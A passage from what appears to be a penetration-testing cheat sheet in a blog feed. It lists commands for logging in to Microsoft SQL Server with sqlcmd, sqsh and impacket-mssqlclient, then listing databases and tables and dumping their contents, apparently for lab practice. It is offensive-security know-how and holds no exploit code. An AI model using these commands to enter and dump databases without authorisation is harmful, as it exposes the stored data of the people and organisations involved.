+    <content><![CDATA[<h1 id="Connect-To-The-Data-Base"><a href="#Connect-To-The-Data-Base" class="headerlink" title="Connect To The Data Base"></a>Connect To The Data Base</h1><h2 id="SQL-Authentication"><a href="#SQL-Authentication" class="headerlink" title="SQL Authentication"></a>SQL Authentication</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h5 id="sqlcmd"><a href="#sqlcmd" class="headerlink" title="sqlcmd"></a>sqlcmd</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sqlcmd -S target -U username -P &#x27;password&#x27; -y <span class="number">30</span> -Y <span class="number">30</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh"><a href="#sqsh" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+
+<h5 id="mssqlclient"><a href="#mssqlclient" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Windows-Authentication-Local-Account"><a href="#Windows-Authentication-Local-Account" class="headerlink" title="Windows Authentication (Local Account)"></a>Windows Authentication (Local Account)</h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-1"><a href="#sqsh-1" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U .\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U HOSTNAME\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="mssqlclient-1"><a href="#mssqlclient-1" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target -windows-auth</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Domain-Authentication-With-DC"><a href="#Domain-Authentication-With-DC" class="headerlink" title="Domain Authentication (With DC)"></a>Domain Authentication (With DC)</h2><h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-2"><a href="#sqsh-2" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U domain\username -P password</span><br></pre></td></tr></table></figure>
+
+<h5 id="mssqlclient-2"><a href="#mssqlclient-2" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient domain/username:password@target</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Enumerate-Data-Base"><a href="#Enumerate-Data-Base" class="headerlink" title="Enumerate Data Base"></a>Enumerate Data Base</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h3 id="sqlcmd-1"><a href="#sqlcmd-1" class="headerlink" title="sqlcmd"></a>sqlcmd</h3><p>When using <code>sqlcmd</code>, each query must be followed by <code>GO</code> to trigger its execution.</p>
+<h5 id="List-Databases"><a href="#List-Databases" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> name FROM master.dbo.sysdatabases</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+
+<h5 id="Select-Database"><a href="#Select-Database" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; USE htbusers</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+
+<h5 id="List-Tables"><a href="#List-Tables" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> table_name FROM htbusers.INFORMATION_SCHEMA.TABLES</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+
+<h5 id="Dump-Specific-Table"><a href="#Dump-Specific-Table" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> * FROM users</span><br><span class="line"><span class="number">2</span>&gt; go</span><br></pre></td></tr></table></figure>
+
+<h2 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Mssqlclient"><a href="#Mssqlclient" class="headerlink" title="Mssqlclient"></a>Mssqlclient</h3><h5 id="List-Databases-1"><a href="#List-Databases-1" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; SELECT name FROM sys.databases;</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="Select-Database-1"><a href="#Select-Database-1" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; use database-name</span><br></pre></td></tr></table></figure>
+
+<h5 id="List-Tables-1"><a href="#List-Tables-1" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE=<span class="string">&#x27;BASE TABLE&#x27;</span> ORDER BY TABLE_SCHEMA, TABLE_NAME;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Dump-Specific-Table-1"><a href="#Dump-Specific-Table-1" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM table-name;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Service-Enumeration</category>
+        <category>MSSQL</category>
+      </categories>
+      <tags>
+        <tag>MSSQL</tag>
+        <tag>Enumeration</tag>
       </tags>
   </entry>
   <entry>
